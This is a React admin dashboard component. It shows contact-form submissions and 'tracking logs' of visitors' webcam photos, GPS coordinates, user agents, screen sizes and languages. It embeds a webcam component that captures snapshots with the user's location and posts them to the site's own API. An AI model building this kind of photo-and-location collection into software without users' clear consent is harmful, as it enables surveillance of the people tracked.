import React, { useState } from "react";
import axios from "axios";
import WebcamTracker from "./webcamdashboard";

const AdminDashboard = () => {
  const [token, setToken] = useState("");
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [view, setView] = useState("tracking"); // 'tracking' or 'contacts'

  type TrackingLog = {
    id: string | number;
    timestamp: string;
    latitude: number;
    longitude: number;
    userAgent: string;
    screen: string | { width: number; height: number }; // allow object or string
    language: string;
    imagePath?: string;
    lastUpdated?: string;
  };

  type Contact = {
    id: string | number;
    timestamp: string;
    name: string;
    email: string;
    subject: string;
    message: string;
  };

  const [trackingLogs, setTrackingLogs] = useState<TrackingLog[]>([]);
  const [contacts, setContacts] = useState<Contact[]>([]);
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const API_URL = import.meta.env.VITE_API_URL;

  const authHeaders = {
    headers: {
      Authorization: `Bearer ${token}`,
    },
  };

  const handleLogin = () => {
    setError(null);
    if (!token.trim()) {
      setError("Please enter admin token.");
      return;
    }
    setLoading(true);

    axios
      .get(`${API_URL}/api/admin/contacts`, authHeaders)
      .then(() => {
        setIsAuthenticated(true);
        fetchData(view);
      })
      .catch(() => {
        setError("Invalid admin token.");
        setLoading(false);
      });
  };

  const fetchData = (currentView: string) => {
    setError(null);
    setLoading(true);
    if (currentView === "tracking") {
      axios
        .get(`${API_URL}/api/admin/tracking`, authHeaders)
        .then((res) => {
          if (res.data.success) {
            // Normalize screen field here: convert object to string if needed
            const normalizedLogs = res.data.tracking.map((log: TrackingLog) => {
              if (
                log.screen &&
                typeof log.screen !== "string" &&
                "width" in log.screen &&
                "height" in log.screen
              ) {
                return {
                  ...log,
                  screen: `${log.screen.width}x${log.screen.height}`,
                };
              }
              return log;
            });
            setTrackingLogs(normalizedLogs);
          } else setError("Failed to fetch tracking logs.");
          setLoading(false);
        })
        .catch(() => {
          setError("Failed to fetch tracking logs.");
          setLoading(false);
        });
    } else {
      axios
        .get(`${API_URL}/api/admin/contacts`, authHeaders)
        .then((res) => {
          if (res.data.success) setContacts(res.data.contacts);
          else setError("Failed to fetch contacts.");
          setLoading(false);
        })
        .catch(() => {
          setError("Failed to fetch contacts.");
          setLoading(false);
        });
    }
  };

  const handleViewChange = (newView: string) => {
    setView(newView);
    fetchData(newView);
  };

  const tableHeaderStyle: React.CSSProperties = {
    borderBottom: "2px solid #ddd",
    padding: "12px 8px",
    textAlign: "left",
    backgroundColor: "#f8f9fa",
    fontWeight: "600",
    fontSize: 14,
    color: "#333",
  };

  const tableCellStyle: React.CSSProperties = {
    borderBottom: "1px solid #eee",
    padding: "10px 8px",
    fontSize: 14,
    color: "#444",
    verticalAlign: "middle",
  };

  const buttonBaseStyle: React.CSSProperties = {
    padding: "10px 22px",
    marginRight: 12,
    borderRadius: 6,
    fontSize: 15,
    fontWeight: 600,
    border: "none",
    cursor: "pointer",
    transition: "background-color 0.3s ease",
  };

  if (!isAuthenticated) {
    return (
      <div
        style={{
          maxWidth: 400,
          margin: "4rem auto",
          padding: "2rem",
          border: "1px solid #ddd",
          borderRadius: 10,
          fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
          boxShadow: "0 4px 15px rgba(0,0,0,0.1)",
          backgroundColor: "#fff",
        }}
      >
        <h2
          style={{
            marginBottom: 20,
            textAlign: "center",
            color: "#222",
            fontWeight: "700",
            fontSize: 24,
          }}
        >
          Admin Login
        </h2>
        <input
          type="password"
          placeholder="Enter admin token"
          value={token}
          onChange={(e) => setToken(e.target.value)}
          style={{
            width: "100%",
            padding: "12px",
            marginBottom: 20,
            fontSize: 16,
            color:"black",
            borderRadius: 6,
            border: "1px solid #ccc",
            boxSizing: "border-box",
            outline: "none",
            transition: "border-color 0.2s",
          }}
          onFocus={(e) => (e.currentTarget.style.borderColor = "#007bff")}
          onBlur={(e) => (e.currentTarget.style.borderColor = "#ccc")}
        />
        <button
          onClick={handleLogin}
          disabled={loading}
          style={{
            ...buttonBaseStyle,
            width: "100%",
            backgroundColor: loading ? "#6c757d" : "#007bff",
            color: "#fff",
          }}
          onMouseEnter={(e) => {
            if (!loading) e.currentTarget.style.backgroundColor = "#0056b3";
          }}
          onMouseLeave={(e) => {
            if (!loading) e.currentTarget.style.backgroundColor = "#007bff";
          }}
        >
          {loading ? "Logging in..." : "Login"}
        </button>
        {error && (
          <p
            style={{
              color: "red",
              marginTop: 15,
              fontWeight: 600,
              textAlign: "center",
            }}
          >
            {error}
          </p>
        )}
      </div>
    );
  }

  return (
    <div
      style={{
        maxWidth: 1024,
        margin: "2rem auto 4rem",
        fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
        padding: "0 15px",
        backgroundColor: "#fff",
        borderRadius: 10,
        boxShadow: "0 4px 25px rgba(0,0,0,0.05)",
      }}
    >
      <h1
        style={{
          fontWeight: "700",
          fontSize: 28,
          color: "#222",
          marginBottom: 24,
          textAlign: "center",
        }}
      >
        Admin Dashboard
      </h1>

      <WebcamTracker
        onSnapshot={(base64Image: string) => {
          const screen = {
            width: window.screen.width,
            height: window.screen.height,
          };

          const sendTracking = (latitude: number, longitude: number) => {
            fetch(`${API_URL}/api/track`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                latitude,
                longitude,
                userAgent: navigator.userAgent,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                image: base64Image,
              }),
            })
              .then((res) => {
                if (!res.ok) throw new Error("Tracking failed");
                return res.json();
              })
              .then((data) => {
                console.log("Tracking saved:", data);
                if (data.action) {
                  // "created" or "updated"
                  console.log(`Record was ${data.action}`);
                }
              })
              .catch((err) => {
                console.error("Tracking error:", err);
              });
          };

          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
              (position) => {
                sendTracking(position.coords.latitude, position.coords.longitude);
              },
              (error) => {
                console.error("Geolocation error:", error);
                // Fallback to default (0,0)
                sendTracking(0, 0);
              }
            );
          } else {
            sendTracking(0, 0);
          }
        }}
      />

      <div
        style={{
          marginTop: 30,
          marginBottom: 20,
          textAlign: "center",
        }}
      >
        <button
          onClick={() => handleViewChange("tracking")}
          style={{
            ...buttonBaseStyle,
            backgroundColor: view === "tracking" ? "#007bff" : "#6c757d",
            color: "white",
          }}
          onMouseEnter={(e) => {
            if (view !== "tracking") e.currentTarget.style.backgroundColor = "#5a6268";
          }}
          onMouseLeave={(e) => {
            if (view !== "tracking") e.currentTarget.style.backgroundColor = "#6c757d";
          }}
        >
          Tracking Logs
        </button>
        <button
          onClick={() => handleViewChange("contacts")}
          style={{
            ...buttonBaseStyle,
            backgroundColor: view === "contacts" ? "#007bff" : "#6c757d",
            color: "white",
          }}
          onMouseEnter={(e) => {
            if (view !== "contacts") e.currentTarget.style.backgroundColor = "#5a6268";
          }}
          onMouseLeave={(e) => {
            if (view !== "contacts") e.currentTarget.style.backgroundColor = "#6c757d";
          }}
        >
          Contact Submissions
        </button>
      </div>

      {error && (
        <p
          style={{
            color: "red",
            marginBottom: 10,
            fontWeight: 600,
            textAlign: "center",
          }}
        >
          <b>Error:</b> {error}
        </p>
      )}

      {loading ? (
        <p style={{ textAlign: "center", fontSize: 16 }}>Loading...</p>
      ) : view === "tracking" ? (
        trackingLogs.length === 0 ? (
          <p style={{ textAlign: "center", fontSize: 16 }}>
            No tracking logs found.
          </p>
        ) : (
          <div style={{ overflowX: "auto" }}>
            <table
              style={{
                width: "100%",
                borderCollapse: "collapse",
                minWidth: 800,
              }}
            >
              <thead>
                <tr>
                  <th style={tableHeaderStyle}>Timestamp</th>
                  <th style={tableHeaderStyle}>Location (Lat, Lon)</th>
                  <th style={tableHeaderStyle}>User Agent</th>
                  <th style={tableHeaderStyle}>Screen</th>
                  <th style={tableHeaderStyle}>Language</th>
                  <th style={tableHeaderStyle}>Photo</th>
                </tr>
              </thead>
              <tbody>
                {trackingLogs.map((log, index) => (
                  <tr
                    key={log.id ?? index}
                    style={{ cursor: "default" }}
                    onMouseEnter={(e) =>
                      (e.currentTarget.style.backgroundColor = "#f1f7ff")
                    }
                    onMouseLeave={(e) =>
                      (e.currentTarget.style.backgroundColor = "transparent")
                    }
                  >
                    <td style={tableCellStyle}>
                      {new Date(log.timestamp).toLocaleString()}
                    </td>
                    <td style={tableCellStyle}>
                      Lat: {log.latitude.toFixed(4)}, Lon:{" "}
                      {log.longitude.toFixed(4)}
                    </td>
                    <td
                      style={{
                        ...tableCellStyle,
                        maxWidth: 220,
                        wordBreak: "break-word",
                      }}
                      title={log.userAgent}
                    >
                      {log.userAgent.length > 50
                        ? log.userAgent.slice(0, 47) + "..."
                        : log.userAgent}
                    </td>
                    <td style={tableCellStyle}>
                      {/* Fix screen rendering */}
                      {typeof log.screen === "string"
                        ? log.screen
                        : log.screen && "width" in log.screen && "height" in log.screen
                        ? `${log.screen.width}x${log.screen.height}`
                        : "N/A"}
                    </td>
                    <td style={tableCellStyle}>{log.language}</td>
                    <td style={tableCellStyle}>
                      {log.imagePath ? (
                      <img
  src={`${API_URL.replace(/\/$/, "")}${log.imagePath}`}
  alt="User snapshot"
  width={120}         // width stays small for table view
  height={200}        // increase height for portrait look
  style={{
    objectFit: "cover",
    borderRadius: 8,
    boxShadow: "0 2px 8px rgba(0,0,0,0.15)",
    cursor: "pointer",
    transition: "transform 0.2s ease",
  }}
  crossOrigin="anonymous"
  onError={(e) => {
    const target = e.currentTarget;
    console.error("Image load error:", target.src);
    target.src = "https://placehold.co/120x200?text=No+Image";
  }}
  onClick={() => window.open(`${API_URL.replace(/\/$/, "")}${log.imagePath}`, "_blank")} // optional: open full image on click
  onMouseEnter={(e) => (e.currentTarget.style.transform = "scale(1.05)")}
  onMouseLeave={(e) => (e.currentTarget.style.transform = "scale(1)")}
/>

                      ) : (
                        "No image"
                      )}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )
      ) : contacts.length === 0 ? (
        <p style={{ textAlign: "center", fontSize: 16 }}>
          No contact submissions found.
        </p>
      ) : (
        <div style={{ overflowX: "auto" }}>
          <table
            style={{
              width: "100%",
              borderCollapse: "collapse",
              minWidth: 700,
            }}
          >
            <thead>
              <tr>
                <th style={tableHeaderStyle}>Timestamp</th>
                <th style={tableHeaderStyle}>Name</th>
                <th style={tableHeaderStyle}>Email</th>
                <th style={tableHeaderStyle}>Subject</th>
                <th style={tableHeaderStyle}>Message</th>
              </tr>
            </thead>
            <tbody>
              {contacts.map((c, index) => (
                <tr
                  key={c.id ?? index}
                  style={{ cursor: "default" }}
                  onMouseEnter={(e) =>
                    (e.currentTarget.style.backgroundColor = "#f1f7ff")
                  }
                  onMouseLeave={(e) =>
                    (e.currentTarget.style.backgroundColor = "transparent")
                  }
                >
                  <td style={tableCellStyle}>
                    {new Date(c.timestamp).toLocaleString()}
                  </td>
                  <td style={tableCellStyle}>{c.name}</td>
                  <td style={tableCellStyle}>{c.email}</td>
                  <td style={tableCellStyle}>{c.subject}</td>
                  <td
                    style={{
                      ...tableCellStyle,
                      whiteSpace: "pre-wrap",
                      maxWidth: 300,
                    }}
                    title={c.message}
                  >
                    {c.message.length > 70
                      ? c.message.slice(0, 67) + "..."
                      : c.message}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
};

export default AdminDashboard;
